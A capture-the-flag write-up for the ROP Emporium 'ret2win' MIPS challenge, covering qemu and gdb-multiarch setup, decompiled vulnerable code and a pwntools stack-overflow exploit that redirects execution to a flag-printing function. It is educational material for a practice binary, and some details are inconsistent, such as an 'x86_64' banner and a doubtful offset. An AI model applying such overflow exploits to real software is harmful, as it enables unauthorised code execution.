# Ret2win (MIPS)

## MIPS architecture
Description [here](https://en.wikipedia.org/wiki/MIPS_architecture#Registers)<br>
Registers [here](https://www.doc.ic.ac.uk/lab/secondyear/spim/node10.html)<br>
Instruction set [here](https://www.dsi.unive.it/~gasparetto/materials/MIPS_Instruction_Set.pdf) 
### Calling convention
`MIPS` has not a standard calling convention, so it entirely depends on the specific compiler. However some calling conventions are more used than others: `O32` and `N32/N64`. 

![O32](imgs/O32.png)
![N](imgs/N32_N64.png)
### Frame structure
![framestructure](imgs/frame_mips.png)

Source: [here](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/)

## Running MIPS binary using qemu and debugging with gdb-multiarch
### Installation
You'll need to install `qemu` to run the binary.
```bash
sudo apt install qemu qemu-user
```
### Libraries
There are required libraries to run this program, you can download them following [this link](https://github.com/angr/binaries/tree/master/tests/mipsel)
### Execution
Once downloaded the mandatory `libraries`, you can run the program typing:
```bash
qemu-mipsel -L /path/to/libraries ./ret2win_mipsel
```

If you want, you can move the libs in `/lib/` and run the `qemu-mipsel ./ret2win_mipsel` command normally.

### Debugging
To debug this program with `gdb`, we have to setup `qemu` accordingly to accept gdb connections.
To do so, we must provide the `-g <port>` parameter. The final command should look like this:
```bash
qemu-mipsel -L /path/to/libraries -g <port> ./ret2win_mipsel
```
Using another terminal, we should be able to connect to `qemu` using `gdb`.
Normal `gdb` won't be adapt for our objective, so we'll have to use a `multiarch gdb` (install it by issuing `sudo apt install -y gdb-multiarch`)
Once done, we can connect to the remote target using this series of `gdb` commands (or a `gdb script` if you're more familiar with that).
```bash
gdb-multiarch
```
```gdb
symbol-file ./ret2win_mipsel
set arch mips:isa32
target remote :<port>
```

## Reversing with Ghidra
### Main
```c
int main() {
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```
### pwnme
```c
void pwnme() {
  char buf[32];
  
  memset(buf, 0, 0x20);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don\'t worry about null bytes, we\'re using read()!\n");
  printf("> ");
  read(0, buf, 0x38);
  puts("Thank you!");
  return;
}
```
### ret2win (target)
```c
void ret2win() {
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

## The vuln
The `read` function reads `0x38` (`56`) bytes but the buffer is only `32` bytes long, this allows us to overflow the `buf` variable and write on the stack wherever we want (the `return address` in our case).

## The exploit
```py
from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win_mipsel')

#
# ROP
#

target = p32(0x00400a00)

#
# Find Offset
#

# launch qemu with payload
"""
python3 -c 'from pwn import *; print(cyclic(0x38))' | qemu-mipsel -g <port> ./ret2win_mipsel
"""

# gdb-multiarch script
"""
symbol-file ret2win_mips
set arch mips:isa32
target remote :<port>

b *pwnme+252
i r ra
"""

# calculate offset
"""
python3 -c 'from pwn import *; print(cyclic_find(bytes.fromhex("6161616a")))'
"""

offset = 33
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())

io.close()
```